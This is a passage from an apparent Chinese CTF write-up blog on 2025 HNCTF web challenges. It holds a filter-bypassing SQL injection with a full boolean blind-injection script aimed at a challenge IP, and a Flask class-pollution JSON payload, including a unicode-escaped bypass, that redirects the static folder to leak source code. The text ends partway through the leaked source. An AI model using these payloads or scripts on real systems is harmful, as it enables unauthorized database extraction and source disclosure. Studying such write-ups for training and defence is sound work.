<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ycycyc - 2025HNCTF-web复现</title>
    <link rel="stylesheet" href="/css/styles.css">
    <link rel="stylesheet" href="/css/tailwind.css">
    <link rel="stylesheet" href="/css/highlight.css">
    <link rel="stylesheet" href="/css/toc.css">
    
<header class="bg-black text-hacker-white py-4 font-dos font-extrabold">
    <div class="container mx-auto flex items-center justify-between space-x-8">
    
      <h1 class="text-2xl font-bold ml-[100px] md:ml-0 animate-pulse text-hacker-color1 md:mr-[20%]">
        <a href="/" class="hover:text-white transition-colors select-none">
          ycycyc
        </a>
      </h1>
  
    <!-- 大屏幕 -->
      <nav class="hidden md:block">
        <ul class="flex space-x-6">
          
            <li>
              <a href="/" class="select-none text-lg hover:text-hacker-color1 transition-all hover:underline decoration-wavy duration-300 text-hacker-color3">
                Home
              </a>
            </li>
          
            <li>
              <a href="/archives" class="select-none text-lg hover:text-hacker-color1 transition-all hover:underline decoration-wavy duration-300 text-hacker-color3">
                Archives
              </a>
            </li>
          
            <li>
              <a href="/categories" class="select-none text-lg hover:text-hacker-color1 transition-all hover:underline decoration-wavy duration-300 text-hacker-color3">
                Categories
              </a>
            </li>
          
            <li>
              <a href="/tags" class="select-none text-lg hover:text-hacker-color1 transition-all hover:underline decoration-wavy duration-300 text-hacker-color3">
                Tags
              </a>
            </li>
          
            <li>
              <a href="/about" class="select-none text-lg hover:text-hacker-color1 transition-all hover:underline decoration-wavy duration-300 text-hacker-color3">
                About
              </a>
            </li>
          
        </ul>
      </nav>
  
      <!-- 小屏幕 -->
      <button id="menu-toggle" class="block md:hidden text-white focus:outline-none">
        <svg class="w-6 h-6" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
          <path stroke-linecap="round" stroke-linejoin="round" d="M4 6h16M4 12h16M4 18h16"></path>
        </svg>
      </button>
    </div>
  
    <!-- 折叠菜单 -->
    <nav id="mobile-menu" class="hidden bg-black">
      <ul class="space-y-2 py-4 px-6">
        
          <li>
            <a href="/" class="block text-white hover:text-hacker-color1 transition-colors">
              Home
            </a>
          </li>
        
          <li>
            <a href="/archives" class="block text-white hover:text-hacker-color1 transition-colors">
              Archives
            </a>
          </li>
        
          <li>
            <a href="/categories" class="block text-white hover:text-hacker-color1 transition-colors">
              Categories
            </a>
          </li>
        
          <li>
            <a href="/tags" class="block text-white hover:text-hacker-color1 transition-colors">
              Tags
            </a>
          </li>
        
          <li>
            <a href="/about" class="block text-white hover:text-hacker-color1 transition-colors">
              About
            </a>
          </li>
        
      </ul>
    </nav>
   <!-- Google tag (gtag.js) -->
<script async src="https://www.googletagmanager.com/gtag/js?id=G-F9W89HDHWL"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'G-F9W89HDHWL');
</script>
  
    <!-- RSS Link -->
    <link rel="alternate" type="application/rss+xml" title=" RSS" href="/rss.xml" />
  </header>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/lunr.js/2.3.9/lunr.min.js"></script>
  <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
  <script src="/js/search.js"></script>
  <script>
        document.addEventListener("DOMContentLoaded", () => {
    const menuToggle = document.getElementById("menu-toggle");
    const mobileMenu = document.getElementById("mobile-menu");

    menuToggle.addEventListener("click", () => {
        if (mobileMenu.classList.contains("hidden")) {
        mobileMenu.classList.remove("hidden");
        } else {
        mobileMenu.classList.add("hidden");
        }
    });
    });

  </script>
  

    <style>
        p {
            margin-top: 0 !important;
            margin-bottom: 1rem !important;
            font-size: 1.1rem;
        }
        figure {
            margin: 0 !important;
        }
        pre {
            padding: 0 !important;
            margin-top: 0 !important;
            margin-bottom: 1rem !important;
        }
        td {
            padding: 0 !important;
            margin-bottom: 1rem !important;
        }
        h1, h2, h3, h4, h5, h6 {
            margin-top: 0 !important;
            margin-bottom: 1rem !important;
        }
        @media (min-width: 1024px) {
            #middle-box {
                min-width: 56rem;
            }
        }
    </style>
<meta name="generator" content="Hexo 7.3.0"></head>
<body class="bg-black text-hacker-color3 container mx-auto" style="overflow-x:hidden">
    <!-- 文章标题 -->
    <h1 class="text-5xl text-hacker-color1 font-bold font-dos my-6 text-center">2025HNCTF-web复现</h1>

    <!-- 发布时间 -->
    <p class="text-hacker-color3 text-center text-sm mb-4">
        2025-06-27
    </p>

    <!-- 文章内容 -->
    <div id="article-content" class="article-entry prose prose-invert mx-auto max-w-4xl leading-relaxed highlight" style="display: flex;">
        <div id="middle-box">
            <h1 id="半成品login"><a href="#半成品login" class="headerlink" title="半成品login"></a>半成品login</h1><p>尝试弱密码进行登录</p>
<p>admin&#x2F;admin123,成功登录后台</p>
<p><img src="https://cdn.jsdelivr.net/gh/ycycyc0/picture-bed@img/img/image-20250618154732285.png"></p>
<p>根据提示这个后台并不能得到有用的信息</p>
<p>尝试进行sql注入随意输入一个账号和密码登录并进行抓包，得到一下的数据包</p>
<p><img src="https://cdn.jsdelivr.net/gh/ycycyc0/picture-bed@img/img/image-20250618160301396.png" alt="image-20250618160301396"></p>
<p>尝试构造sql注入，发现密码的位置存在sql注入</p>
<p>经过测试发现对单引号和or关键字进行了过滤</p>
<p>单引号可以使用双编码绕过，%2527，or关键字可以使用||进行替换</p>
<p><img src="https://cdn.jsdelivr.net/gh/ycycyc0/picture-bed@img/img/image-20250618161235375.png" alt="image-20250618161235375"></p>
<p>出入成功，payload为</p>
<pre class="line-numbers language-none"><code class="language-none">username&#x3D;admin&amp;password&#x3D;1%2527||1&#x3D;1#<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>发现是存在回显的，尝试适应oder by语句查看回显的列数</p>
<pre class="line-numbers language-none"><code class="language-none">username&#x3D;admin&amp;password&#x3D;1%2527oder by 4#<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>没有回显说明这里存在过滤，先考虑是过滤了空格</p>
<pre class="line-numbers language-none"><code class="language-none">username&#x3D;admin&amp;password&#x3D;1%2527oder&#x2F;**&#x2F;by&#x2F;**&#x2F;4#<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://cdn.jsdelivr.net/gh/ycycyc0/picture-bed@img/img/image-20250618164253388.png" alt="image-20250618164253388"></p>
<p><img src="https://cdn.jsdelivr.net/gh/ycycyc0/picture-bed@img/img/image-20250618164313866.png" alt="image-20250618164313866"></p>
<p>根据两次回显的不同，确定列数为4</p>
<p>测试发现这里的select关键字也被过滤了，考虑到mysql的特性注入</p>
<p>查看当前的mysql的版本</p>
<pre class="line-numbers language-none"><code class="language-none">username&#x3D;admin&amp;password&#x3D;1%2537||@@version&#x2F;**&#x2F;like&#x2F;**&#x2F;%2527%8.%%2527#
等价于
username&#x3D;admin&amp;password&#x3D;1&#39;||@@version&#x2F;**&#x2F;LIKE&#x2F;**&#x2F;&#39;%8.%&#39;#<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p><img src="https://cdn.jsdelivr.net/gh/ycycyc0/picture-bed@img/img/image-20250618181121953.png" alt="image-20250618181121953"></p>
<p>可以看见登录成功，说明这里使用的就是mysql8的版本</p>
<p>可以利用table注入，但是需要能够利用的表明，这里可以利用一些而系统视图来实现</p>
<p>以下是别人的wp提供的布尔盲注的脚本。</p>
<pre class="line-numbers language-none"><code class="language-none">import requests
import time

url &#x3D; &quot;http:&#x2F;&#x2F;124.71.84.202:10071&#x2F;login.php&quot;
flagstr &#x3D; &quot;0123456789:;&lt;&#x3D;&gt;?@_&#96;abcdefghijklmnopqrstuvwxyz&#123;|&#125;~&quot;
headers &#x3D; &#123;
    &quot;Content-Type&quot;: &quot;application&#x2F;x-www-form-urlencoded&quot;
&#125;

tempstr &#x3D; &quot;&quot;
flag &#x3D; &quot;&quot;

for i in range(1, 15):
    for idx in range(len(flagstr)):  # 使用索引遍历
        x &#x3D; flagstr[idx]  # 获取当前字符
        prefix &#x3D; tempstr + x

        # Payload templates
        payload1 &#x3D; &quot;1%27&#x2F;**&#x2F;||(%27&#123;&#125;%27,%271%27,%2711%27,%2711%27)&lt;(table&#x2F;**&#x2F;sys.schema_tables_with_full_table_scans&#x2F;**&#x2F;limit&#x2F;**&#x2F;1)#&quot;.format(tempstr+x)
        # 获得数据库名: hnctfweb

        payload2 &#x3D; &quot;1%27&#x2F;**&#x2F;||(%27hnctfweb%27,%27&#123;&#125;%27,%2711%27,%2711%27)&lt;(table&#x2F;**&#x2F;sys.schema_tables_with_full_table_scans&#x2F;**&#x2F;limit&#x2F;**&#x2F;1)#&quot;.format(tempstr+x)
        # 获得表名: hnctfuser

        payload3 &#x3D; &quot;1%27&#x2F;**&#x2F;||(%27&#123;&#125;%27,%27%27,%271%27,%2711%27)&lt;(table&#x2F;**&#x2F;hnctfuser&#x2F;**&#x2F;limit&#x2F;**&#x2F;1)#&quot;.format(tempstr + x)
        # 获得第一列id值: 1

        payload4 &#x3D; &quot;1%27&#x2F;**&#x2F;||(%271%27,%27&#123;&#125;%27,%271%27,%2711%27)&lt;(table&#x2F;**&#x2F;hnctfuser&#x2F;**&#x2F;limit&#x2F;**&#x2F;1)#&quot;.format(tempstr+x)
        # 获得第二列username值: admin

        payload5 &#x3D; &quot;1%27&#x2F;**&#x2F;||(%271%27,%27admin%27,%27&#123;&#125;%27,%2711%27)&lt;(table&#x2F;**&#x2F;hnctfuser&#x2F;**&#x2F;limit&#x2F;**&#x2F;1)#&quot;.format(tempstr + x)
        # 获得第三列password值: admin123

        payload6 &#x3D; &quot;1%27&#x2F;**&#x2F;||(%271%27,%27admin%27,%27admin123%27,%27&#123;&#125;%27)&lt;(table&#x2F;**&#x2F;hnctfuser&#x2F;**&#x2F;limit&#x2F;**&#x2F;1)#&quot;.format(tempstr + x)
        # 获得第四列值: noflaginhere

        payload7 &#x3D; &quot;1%27&#x2F;**&#x2F;||(%27&#123;&#125;%27,%271%27,%271%27,%271%27)&lt;(table&#x2F;**&#x2F;hnctfuser&#x2F;**&#x2F;limit&#x2F;**&#x2F;1&#x2F;**&#x2F;offset&#x2F;**&#x2F;1)#&quot;.format(tempstr + x)
        # 获得第一列id值: 2

        payload8 &#x3D; &quot;1%27&#x2F;**&#x2F;||(%272%27,%27&#123;&#125;%27,%271%27,%271%27)&lt;(table&#x2F;**&#x2F;hnctfuser&#x2F;**&#x2F;limit&#x2F;**&#x2F;1&#x2F;**&#x2F;offset&#x2F;**&#x2F;1)#&quot;.format(tempstr + x)
        # 获得需要的关键用户名: hacker*****

        payload9 &#x3D; &quot;1%27&#x2F;**&#x2F;||(%272%27,%27hackerohtii%27,%27&#123;&#125;%27,%271%27)&lt;(table&#x2F;**&#x2F;hnctfuser&#x2F;**&#x2F;limit&#x2F;**&#x2F;1&#x2F;**&#x2F;offset&#x2F;**&#x2F;1)#&quot;.format(tempstr + x)

        data &#x3D; &#123;
            &quot;username&quot;: &quot;admin&quot;,
            &quot;password&quot;: payload9
        &#125;

        res &#x3D; requests.post(url&#x3D;url, data&#x3D;data, allow_redirects&#x3D;False, headers&#x3D;headers)

        if &quot;登陆成功&quot; in res.text:
            continue
        elif &quot;错误&quot; in res.text:
            current_char &#x3D; flagstr[idx - 1]
            if current_char &#x3D;&#x3D; &#39;~&#39;:
                print(&quot;遇到 ~，提前终止，请确认数据是否正确。&quot;)
                break
            tempstr +&#x3D; current_char
            flag &#x3D; tempstr
            print(f&quot;当前结果: &#123;flag&#125;&quot;)
            break

print(f&quot;最终结果: &#123;flag&#125;&quot;)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>下面是对payload的解析</p>
<p>这里table注入利用的表是sys.schema_tables_with_full_table_scans，这个系统视图的数据第一行包含了数据库名和表名</p>
<p>首先是payload1</p>
<p>从左到右循环字符来匹配sys.schema_tables_with_full_table_scans视图表的第一行的数据，首先匹配的就是数据库名</p>
<p>payload2</p>
<p>完成了第一个数据的匹配之后，即确定了数据库名之后进行匹配表名</p>
<p>payload3</p>
<p>成功得到表名之后就可以直接使用table查询表的内容，首先仍然是匹配第一行的第一个数据</p>
<p>接下来就是获取全部的对应表中的第一行的数据，发现没有有价值的信息，接下来在table注入的操作中引入一个<strong>新的关键字offset</strong>，他的作用主要是跳过第一行的数据，直接查看第二行的数据并进行匹配。</p>
<p>还有一个要注意的点就是于PerformanceSchema的机制限制，我们需要现在系统真正的运行一次sql查询才会触发Performance Schema的数据刷新机制，才会在sys.schema_tables_with_full_table_scans视图上面留下需要的信息。</p>
<h1 id="奇怪的咖啡店"><a href="#奇怪的咖啡店" class="headerlink" title="奇怪的咖啡店"></a>奇怪的咖啡店</h1><p>f12发现给了源码，发现源码是python写的</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span> session<span class="token punctuation">,</span> request<span class="token punctuation">,</span> render_template_string<span class="token punctuation">,</span> render_template
<span class="token keyword">import</span> json
<span class="token keyword">import</span> os

app <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>
app<span class="token punctuation">.</span>config<span class="token punctuation">[</span><span class="token string">'SECRET_KEY'</span><span class="token punctuation">]</span> <span class="token operator">=</span> os<span class="token punctuation">.</span>urandom<span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token builtin">hex</span><span class="token punctuation">(</span><span class="token punctuation">)</span>

<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">,</span> <span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">store</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">if</span> <span class="token keyword">not</span> session<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'name'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        session<span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token string">"customer"</span><span class="token punctuation">)</span>
        session<span class="token punctuation">[</span><span class="token string">'permission'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span>

    error_message <span class="token operator">=</span> <span class="token string">''</span>
    <span class="token keyword">if</span> request<span class="token punctuation">.</span>method <span class="token operator">==</span> <span class="token string">'POST'</span><span class="token punctuation">:</span>
        error_message <span class="token operator">=</span> <span class="token string">'&lt;p style="color: red; font-size: 0.8em;">该商品暂时⽆法购买，请稍后再试！&lt;/p>'</span>

    products <span class="token operator">=</span> <span class="token punctuation">[</span>
        <span class="token punctuation">&#123;</span><span class="token string">"id"</span><span class="token punctuation">:</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token string">"name"</span><span class="token punctuation">:</span> <span class="token string">"美式咖啡"</span><span class="token punctuation">,</span> <span class="token string">"price"</span><span class="token punctuation">:</span> <span class="token number">9.99</span><span class="token punctuation">,</span> <span class="token string">"image"</span><span class="token punctuation">:</span> <span class="token string">"1.png"</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
        <span class="token punctuation">&#123;</span><span class="token string">"id"</span><span class="token punctuation">:</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token string">"name"</span><span class="token punctuation">:</span> <span class="token string">"橙c美式"</span><span class="token punctuation">,</span> <span class="token string">"price"</span><span class="token punctuation">:</span> <span class="token number">19.99</span><span class="token punctuation">,</span> <span class="token string">"image"</span><span class="token punctuation">:</span> <span class="token string">"2.png"</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
        <span class="token punctuation">&#123;</span><span class="token string">"id"</span><span class="token punctuation">:</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token string">"name"</span><span class="token punctuation">:</span> <span class="token string">"摩卡"</span><span class="token punctuation">,</span> <span class="token string">"price"</span><span class="token punctuation">:</span> <span class="token number">29.99</span><span class="token punctuation">,</span> <span class="token string">"image"</span><span class="token punctuation">:</span> <span class="token string">"3.png"</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
        <span class="token punctuation">&#123;</span><span class="token string">"id"</span><span class="token punctuation">:</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token string">"name"</span><span class="token punctuation">:</span> <span class="token string">"卡布奇诺"</span><span class="token punctuation">,</span> <span class="token string">"price"</span><span class="token punctuation">:</span> <span class="token number">19.99</span><span class="token punctuation">,</span> <span class="token string">"image"</span><span class="token punctuation">:</span> <span class="token string">"4.png"</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
        <span class="token punctuation">&#123;</span><span class="token string">"id"</span><span class="token punctuation">:</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token string">"name"</span><span class="token punctuation">:</span> <span class="token string">"冰拿铁"</span><span class="token punctuation">,</span> <span class="token string">"price"</span><span class="token punctuation">:</span> <span class="token number">29.99</span><span class="token punctuation">,</span> <span class="token string">"image"</span><span class="token punctuation">:</span> <span class="token string">"5.png"</span><span class="token punctuation">&#125;</span>
    <span class="token punctuation">]</span>

    <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'index.html'</span><span class="token punctuation">,</span>
                         error_message<span class="token operator">=</span>error_message<span class="token punctuation">,</span>
                         session<span class="token operator">=</span>session<span class="token punctuation">,</span>
                         products<span class="token operator">=</span>products<span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">add</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">pass</span>

<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/add'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'POST'</span><span class="token punctuation">,</span> <span class="token string">'GET'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">adddd</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">if</span> request<span class="token punctuation">.</span>method <span class="token operator">==</span> <span class="token string">'GET'</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> <span class="token triple-quoted-string string">'''
            &lt;html>
                &lt;body style="background-image: url('/static/img/7.png'); background-size: cover; background-repeat: no-repeat;">
                    &lt;h2>添加商品&lt;/h2>
                    &lt;form id="productForm">
                        &lt;p>商品名称: &lt;input type="text" id="name">&lt;/p>
                        &lt;p>商品价格: &lt;input type="text" id="price">&lt;/p>
                        &lt;button type="button" onclick="submitForm()">添加商品&lt;/button>
                    &lt;/form>
                    &lt;script>
                        function submitForm() &#123;
                            const nameInput = document.getElementById('name').value;
                            const priceInput = document.getElementById('price').value;
                            fetch(`/add?price=$&#123;encodeURIComponent(priceInput)&#125;`, &#123;
                                method: 'POST',
                                headers: &#123;
                                    'Content-Type': 'application/json',
                                &#125;,
                                body: nameInput
                            &#125;)
                            .then(response => response.text())
                            .then(data => alert(data))
                            .catch(error => console.error('错误:', error));
                        &#125;
                    &lt;/script>
                &lt;/body>
            &lt;/html>
        '''</span>
    <span class="token keyword">elif</span> request<span class="token punctuation">.</span>method <span class="token operator">==</span> <span class="token string">'POST'</span><span class="token punctuation">:</span>
        <span class="token keyword">if</span> request<span class="token punctuation">.</span>data<span class="token punctuation">:</span>
            <span class="token keyword">try</span><span class="token punctuation">:</span>
                raw_data <span class="token operator">=</span> request<span class="token punctuation">.</span>data<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span>
                <span class="token keyword">if</span> check<span class="token punctuation">(</span>raw_data<span class="token punctuation">)</span><span class="token punctuation">:</span>
                    <span class="token comment"># 检测添加的商品是否合法</span>
                    <span class="token keyword">return</span> <span class="token string">"该商品违规，⽆法上传"</span>
                json_data <span class="token operator">=</span> json<span class="token punctuation">.</span>loads<span class="token punctuation">(</span>raw_data<span class="token punctuation">)</span>
                <span class="token keyword">if</span> <span class="token keyword">not</span> <span class="token builtin">isinstance</span><span class="token punctuation">(</span>json_data<span class="token punctuation">,</span> <span class="token builtin">dict</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
                    <span class="token keyword">return</span> <span class="token string">"添加失败1"</span>
                merge<span class="token punctuation">(</span>json_data<span class="token punctuation">,</span> add<span class="token punctuation">)</span>
                <span class="token keyword">return</span> <span class="token string">"你⽆法添加商品哦"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>发现了merge()函数</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">merge</span><span class="token punctuation">(</span>src<span class="token punctuation">,</span> dst<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">for</span> k<span class="token punctuation">,</span> v <span class="token keyword">in</span> src<span class="token punctuation">.</span>items<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">if</span> <span class="token builtin">hasattr</span><span class="token punctuation">(</span>dst<span class="token punctuation">,</span> <span class="token string">'__getitem__'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
            <span class="token keyword">if</span> dst<span class="token punctuation">.</span>get<span class="token punctuation">(</span>k<span class="token punctuation">)</span> <span class="token keyword">and</span> <span class="token builtin">type</span><span class="token punctuation">(</span>v<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token builtin">dict</span><span class="token punctuation">:</span>
                merge<span class="token punctuation">(</span>v<span class="token punctuation">,</span> dst<span class="token punctuation">.</span>get<span class="token punctuation">(</span>k<span class="token punctuation">)</span><span class="token punctuation">)</span>
            <span class="token keyword">else</span><span class="token punctuation">:</span>
                dst<span class="token punctuation">[</span>k<span class="token punctuation">]</span> <span class="token operator">=</span> v
        <span class="token keyword">elif</span> <span class="token builtin">hasattr</span><span class="token punctuation">(</span>dst<span class="token punctuation">,</span> k<span class="token punctuation">)</span> <span class="token keyword">and</span> <span class="token builtin">type</span><span class="token punctuation">(</span>v<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token builtin">dict</span><span class="token punctuation">:</span>
            merge<span class="token punctuation">(</span>v<span class="token punctuation">,</span> <span class="token builtin">getattr</span><span class="token punctuation">(</span>dst<span class="token punctuation">,</span> k<span class="token punctuation">)</span><span class="token punctuation">)</span>
        <span class="token keyword">else</span><span class="token punctuation">:</span>
            <span class="token builtin">setattr</span><span class="token punctuation">(</span>dst<span class="token punctuation">,</span> k<span class="token punctuation">,</span> v<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>这是很容易联想到原型污染的一个函数，无论是JavaScript还是python</p>
<p>找一下merge函数的触发点</p>
<pre class="line-numbers language-none"><code class="language-none">merge(json_data, add)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>@app.route(‘&#x2F;add’, methods&#x3D;[‘POST’, ‘GET’])定义了路由在&#x2F;add下面</p>
<pre class="line-numbers language-none"><code class="language-none">raw_data &#x3D; request.data.decode(&#39;utf-8&#39;)  # 用户直接控制的输入
json_data &#x3D; json.loads(raw_data)         # 解析为字典<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>发现json_data完全可控</p>
<pre class="line-numbers language-none"><code class="language-none">if check(raw_data):
                   # 检测添加的商品是否合法
                   return &quot;该商品违规，⽆法上传&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p>这里存在一个check，但是不知道check的是什么内容，可能是给的源码不完整的原因</p>
<p>f12还可以看到图片的位置是在&#x2F;static&#x2F;img，图片作为静态文件是从<code>static</code> 文件夹提供，实际路径由 <code>app._static_folder</code> 属性决定，默认值为 <code>&quot;static&quot;</code></p>
<p>payload的分析(这是污染静态路由的操作)，目的是当前的目录跳转到根目录，从而得到完整的源代码</p>
<pre class="line-numbers language-none"><code class="language-none">&#123;
    &quot;__globals__&quot;: &#123;
        &quot;app&quot;: &#123;
            &quot;_static_folder&quot;: &quot;.&#x2F;&quot;
        &#125;
    &#125;
&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>首先打开&#x2F;add路由，这是一个添加商品的页面，根据上面已知的源代码分析下可以得知这里传参的方式是POST传参</p>
<p><img src="https://cdn.jsdelivr.net/gh/ycycyc0/picture-bed@img/img/image-20250625151529071.png" alt="image-20250625151529071"></p>
<p>可以看到这里通过JSON.loads()解析的数据，所以POST传参payload的时候就需要设置 <code>Content-Type: application/json</code> 请求头</p>
<p><img src="https://cdn.jsdelivr.net/gh/ycycyc0/picture-bed@img/img/image-20250627033912857.png" alt="image-20250627033912857"></p>
<p><img src="https://cdn.jsdelivr.net/gh/ycycyc0/picture-bed@img/img/image-20250627033931508.png" alt="image-20250627033931508"></p>
<p>说明是被check过滤了，尝试编码（utf-16的\u形式）绕过</p>
<p>这样的编码通常应用于在JSON中表示非ascii码的字符</p>
<p><a target="_blank" rel="noopener" href="https://www.branah.com/unicode-converter">Unicode 转换器 - Unicode、UTF-16、UTF-8、UTF-32、百分比、Base64 和十进制转换器</a></p>
<pre class="line-numbers language-none"><code class="language-none">&#123;
    &quot;\u005f\u005f\u0067\u006c\u006f\u0062\u0061\u006c\u0073\u005f\u005f&quot;: &#123;
        &quot;\u0061\u0070\u0070&quot;: &#123;
            &quot;\u005f\u005f\u0073\u0074\u0061\u0074\u0069\u0063\u005f\u0066\u006f\u006c\u0064\u0065\u0072&quot;: &quot;\u002e\u002f&quot;
        &#125;
    &#125;
&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><img src="https://cdn.jsdelivr.net/gh/ycycyc0/picture-bed@img/img/image-20250625154201458.png" alt="image-20250625154201458"></p>
<p>我以为是污染失败了呢，但是尝试直接访问&#x2F;static&#x2F;app.py又得到了源码</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span> session<span class="token punctuation">,</span> request<span class="token punctuation">,</span> render_template_string<span class="token punctuation">,</span> render_template
<span class="token keyword">import</span> json
<span class="token keyword">import</span> os

app <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>
app<span class="token punctuation">.</span>config<span class="token punctuation">[</span><span class="token string">'SECRET_KEY'</span><span class="token punctuation">]</span> <span class="token operator">=</span> os<span class="token punctuation">.</span>urandom<span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token builtin">hex</span><span class="token punctuation">(</span><span class="token punctuation">)</span>

<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">,</span> <span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">store</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">if</span> <span class="token keyword">not</span> session<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'name'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        session<span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token string">"customer"</span><span class="token punctuation">)</span>
        session<span class="token punctuation">[</span><span class="token string">'permission'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span>

    error_message <span class="token operator">=</span> <span class="token string">''</span>
    <span class="token keyword">if</span> request<span class="token punctuation">.</span>method <span class="token operator">==</span> <span class="token string">'POST'</span><span class="token punctuation">:</span>
        error_message <span class="token operator">=</span> <span class="token string">'&lt;p style="color: red; font-size: 0.8em;">该商品暂时无法购买，请稍后再试！&lt;/p>'</span>

    products <span class="token operator">=</span> <span class="token punctuation">[</span>
